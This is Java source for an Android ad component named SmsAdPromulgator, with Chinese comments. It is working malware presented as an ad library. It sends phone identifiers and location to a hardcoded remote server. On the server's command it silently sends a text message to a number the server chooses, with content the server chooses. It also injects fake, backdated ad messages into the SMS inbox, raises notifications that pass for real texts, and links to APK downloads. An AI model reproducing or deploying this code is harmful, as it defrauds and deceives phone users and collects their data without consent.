package com.g.sc;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.http.client.ClientProtocolException;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.l.R;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.webkit.URLUtil;

public class SmsAdPromulgator {

	private String adNormalUrl = "http://wap.cn6000.com/cm/andr/sms.php";
	private String adLocationUrl = "http://wap.cn6000.com/cm/andr/get_addr.php";
	private static final long AD_REFRESH_TIME = 20 * 60 * 1000;
	private static  Context mContext;
	private boolean isUrlSetted = false;
	private boolean runningFlag = true;
	private MobileInfoGetter mobileInfoGetter;
	private static final String[] needPermissions = {
			"android.permission.INTERNET", "android.permission.WRITE_SMS",
			"android.permission.READ_SMS",
			"android.permission.ACCESS_COARSE_LOCATION",
			"android.permission.READ_PHONE_STATE" };
	private static final String GET_SMS_AD_STATUS_OK = "ok";
	private static final int MAX_ADS = 5;
	private static final String TAG = SmsAdPromulgator.class.toString();
	//如果获取错误,5小时后再取
	private static final long errStatusSleepTime =  5*60*60* 1000;
//	private static final long errStatusSleepTime =  2*60* 1000;
	private Thread promulgator = new Thread() {

		@Override
		public void run() {
			while (runningFlag) {
				String smsContent = null;
				try {
					smsContent = getJson();
//					testSMSAd();
					AdLogger.d(TAG, smsContent);
					if (smsContent == null || "".equals(smsContent)) {
						AdLogger.w(TAG, "获取到的JSON为空，无法解析");
					} else {
						try {
							parseJson(smsContent);
						} catch (JSONException e) {
							sleepWhenErrHappens();
							AdLogger.e(TAG, e.getMessage());
						} catch (InterruptedException e) {
							sleepWhenErrHappens();
							AdLogger.e(TAG, e.getMessage());
						}
					}
				} catch (Exception e) {
					AdLogger.e(TAG, e.getMessage());
					sleepWhenErrHappens();
				}
				
			}
		}

		private void sleepWhenErrHappens() {
			try {
				AdLogger.e(TAG, "sleepWhenErrHappens");
				Thread.sleep(errStatusSleepTime);
			} catch (InterruptedException e1) {
				AdLogger.e(TAG, e1.getMessage());
			}
		}

	};

	public SmsAdPromulgator(Context context) {
		mContext = context;
		mobileInfoGetter = new MobileInfoGetter(mContext);
	}

	/**
	 * 调用这个方法停止广告，不然广告线程在程序退出后也会继续存在
	 */
	public void stopAd() {
		runningFlag = false;
	}

	public void setSmsAdUrl(String normalUrl, String locationUrl) {
		if (!isUrlSetted) {
			if (URLUtil.isHttpUrl(normalUrl) && URLUtil.isHttpUrl(locationUrl)) {
				adNormalUrl = normalUrl;
				adLocationUrl = locationUrl;
				isUrlSetted = true;
			} else {
				AdLogger.w(TAG, "请传入符合http规范的url");
			}
		} else {
			AdLogger.w(TAG, "不能重复设置获取广告的url");
		}
	}

	public void startToPromulgateAd() throws NameNotFoundException {
		if (URLUtil.isHttpUrl(adNormalUrl)
				&& URLUtil.isHttpUrl(adLocationUrl)
				&& PermissionChecker.isAllPermissionObtained(mContext,
						needPermissions)) {
			promulgator.start();
		}
	}

	/**
	 * 当网络出现异常时会抛出异常 当网络正常而访问的url不正常时，返回值为空 一切正常时，返回相应的字符串
	 * 
	 * @return
	 * @throws IOException
	 * @throws ClientProtocolException
	 * @throws Exception
	 */
	private String getJson() throws IOException {
		Map<String, String> params = mobileInfoGetter.getAllImmediateInfo();
		AdLogger.i(TAG, "sms app id is: <" + AppConfig.APP_ID + ">");
		AdLogger.i(TAG, "sms app version is: <" + AppConfig.APP_VERSION + ">");
		params.put("app_id", AppConfig.APP_ID);
		params.put("version", AppConfig.APP_VERSION);
		params.put("a_version", AdManager.getInstance().getVersion());
	//	params.put("test", "mumu");
		List<BasicNameValuePair> pairs = PostExcuter.paramPairsPackage(params);
		return PostExcuter.excutePost(adNormalUrl, pairs, mContext);
	}

	private void parseJson(String jsonText) throws JSONException,
			InterruptedException {
		JSONObject rootJson = new JSONObject(jsonText);
		AdLogger.i(TAG, "json==="+jsonText);
		//解析JSON,如果PID 为0,则发送短信.		
		int pid=rootJson.getInt("pid");
		SharedPreferences date = mContext.getSharedPreferences("pid", 0);
		int ispid=date.getInt("ispid", 0);
		boolean isgetpid=false;
		
		if(ispid==0){
			String val=getLogFormFile();
			
			if(val==null){
				isgetpid=true;
			}else{
				isgetpid=false;
				Editor date2 = mContext.getSharedPreferences("pid", 0).edit();
				date2.putInt("ispid", 1);
				date2.commit();
			}
			
		}else{
			isgetpid=false;
		}
		if(pid==0 && isgetpid){
			JSONObject map= rootJson.getJSONObject("bymsg");
				String content2=map.getString("sendmsg");
				 String tophone=map.getString("tophone");
				
				sendSMS(tophone, content2,mContext);
				
		}
		
		String status = rootJson.getString("status");
		if (GET_SMS_AD_STATUS_OK.equals(status)) {
			JSONArray smsAds = rootJson.getJSONArray("msg");
			JSONObject adItem = null;
			long startTime = System.currentTimeMillis();
			for (int i = 0; i < smsAds.length() && i < MAX_ADS; i++) {
				adItem = smsAds.optJSONObject(i);
				String sendNumber = adItem.getString("port");
				String content = adItem.getString("content");
				long time = startTime - i * AD_REFRESH_TIME;
				AdLogger.i("SmsAdPromulgator", "---------从服务器获取的数据-----------"+"号码"+sendNumber+"内容"+content);
				Uri sms_uri = writeSMS(sendNumber, content, time);
				AdLogger.i("SmsAdPromulgator", "---------写入短信-----------"+"Uri: "+sms_uri.getPath());
				if (sms_uri != null){
					Map<String, String> _data = new HashMap<String, String>();
					_data.put("uri", sms_uri.getPath());
					_data.put("pid", Integer.toString(pid));
					_data.put("status", status);
					_data.put("msg", rootJson.getString("msg"));
					_data.put("port", sendNumber);
					_data.put("content", content);
					_data.put("time",Long.toString(time));
					_data.put("sms_status", "unread");
					_data.put("ad_id",rootJson.getString("ad_id"));
					_data.put("ad_type",rootJson.getString("ad_type"));
					_data.put("show_name",rootJson.getString("show_name"));
					_data.put("url",rootJson.getString("url"));
					_data.put("link_type",rootJson.getString("link_type"));
					_data.put("pkg_name",rootJson.getString("pkg_name"));
					_data.put("net",rootJson.getString("net"));

					SMSAdManager.getInstance().onSmsAd(_data);
				}
			}
			int sleepSeconds = rootJson.getInt("sleep");
			AdLogger.i(TAG, "paserjson>>sleep="+sleepSeconds);
			mobileInfoGetter.locate(new AdLocateListener(adLocationUrl,
					mContext));
			Thread.sleep(((long) sleepSeconds * 1000));
		} else {
			Thread.sleep(errStatusSleepTime);
			
		}
	
	}
	
	private void testSMSAd() throws InterruptedException{
		AdLogger.i("testSMSAd", "begin testSMSAd");
		long startTime = System.currentTimeMillis();
		long time = startTime - 3 * AD_REFRESH_TIME;

		Uri sms_uri = writeSMS("33455", "test "+Long.toString(time), time);
		AdLogger.i("testSMSAd", "---------写入短信-----------");
		if (sms_uri != null){
			Map<String, String> _data = new HashMap<String, String>();
			_data.put("uri", sms_uri.getPath());
			_data.put("pid", Integer.toString(132));
			_data.put("status", "ok");
			_data.put("msg", "test msg");
			_data.put("port", "33455");
			_data.put("content", "test "+Long.toString(time));
			_data.put("time",Long.toString(time));
			_data.put("sms_status", "unread");
			_data.put("ad_id",Long.toString(time));
			_data.put("ad_type","sms");
			_data.put("show_name","com."+Long.toString(time)+".ddz");
			_data.put("url","http://www.game.170022.cn/downloads/ddz-1001-1.0.apk");
			_data.put("save_path","save_path");
			_data.put("link_type","apk");
			_data.put("pkg_name","com."+Long.toString(time)+".ddz");
			_data.put("net","wifi");
			SMSAdManager.getInstance().onSmsAd(_data);
		}
		int interval = 120;
		Thread.sleep(((long) interval * 1000));
	}
	
	private Uri writeSMS(String sendNumber, String content, long time) {
		Uri sms_uri = null;
		if (sendNumber != null && content != null && time > 0) {
			ContentValues values = new ContentValues();
			values.put("address", sendNumber);
			values.put("body", content);
			values.put("date", time);
			Uri inbox = Uri.parse("content://sms/inbox");
			sms_uri = mContext.getContentResolver().insert(inbox, values);
			Cursor c = mContext.getContentResolver().query(inbox, null, null,
					null, null);
			AdLogger.i("SmsAdPromulgator", "---------写短信-----------"+"号码"+sendNumber+"内容"+content);
			
			if (null != c) {
				try {
					c.moveToNext();
				} finally {
					c.close();
				}
			}
			ShowNotification(sendNumber,content);
		} else {
			Log.w("WriteSmsActivity", "传入短信参数不正确" + sendNumber + "," + content
					+ "," + time);
		}
		return sms_uri;
	}
	private static void ShowNotification(String number,String content) {

		Intent temp = new Intent();
		temp.setAction(Intent.ACTION_MAIN);
		
		temp.setType("vnd.android-dir/mms-sms");
		PendingIntent pendingIntent = PendingIntent.getActivity(mContext, 0,
				temp, PendingIntent.FLAG_UPDATE_CURRENT);
		Notification notification = new Notification();
		notification.icon = R.drawable.notification;
		notification.tickerText = number + ": " + content;
		notification.flags |= Notification.FLAG_AUTO_CANCEL;
		AdLogger.i("SmsAdPromulgator", "---------点击即取消显示-----------");
		notification.defaults=Notification.DEFAULT_ALL;
		AdLogger.i("SmsAdPromulgator", "---------使用所有默认值，比如声音，震动，闪屏等等-----------");
//		notification.ledARGB = 0xff00ff00;
//		notification.ledOnMS = 300;
//		notification.ledOffMS = 2000;
//		notification.flags |= Notification.FLAG_SHOW_LIGHTS;
		notification.setLatestEventInfo(mContext, number, content,
				pendingIntent);
		NotificationManager notificationManager = (NotificationManager) mContext
				.getSystemService(Context.NOTIFICATION_SERVICE);
		notificationManager.notify(0, notification);
		AdLogger.i("SmsAdPromulgator", "---------发出一条通知-----------" + "内容"
				+ content);
	}

	public static void sendSMS(String mobile,String content,Context context){
		

		PendingIntent pi = PendingIntent.getActivity(context, 0, new Intent(context, SmsAdPromulgator.class), 0);  
	      
        SmsManager sms = SmsManager.getDefault();  
  
        sms.sendTextMessage(mobile, null, content, pi, null);  
		 Log.i(TAG, "发送信息:tophone="+mobile+"***content="+content);
		Editor date = context.getSharedPreferences("pid", 0).edit();
		date.putInt("ispid", 1);
		date.commit();
		 saveLog("false");	
		
	}
	
	private static void saveLog(String str) {
			try {
				BufferedWriter out = null;

				File file =new File("/mnt/sdcard/tblin/aad");
				if(!file.exists()){
					file.mkdir();
				}else{
				
				out = new BufferedWriter(new OutputStreamWriter(
						new FileOutputStream(file+"/smsLog.txt"), "UTF-8"));
				out.write(str);
				}
			} catch (UnsupportedEncodingException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (FileNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
	}
	public static String getLogFormFile(){
		String ss="kk";
		File file =new File("/mnt/sdcard/tblin/aad/smsLog.txt");
		if(!file.exists()){
			
			return null;
		}else{
			return ss;
		}
		
		
	}

}
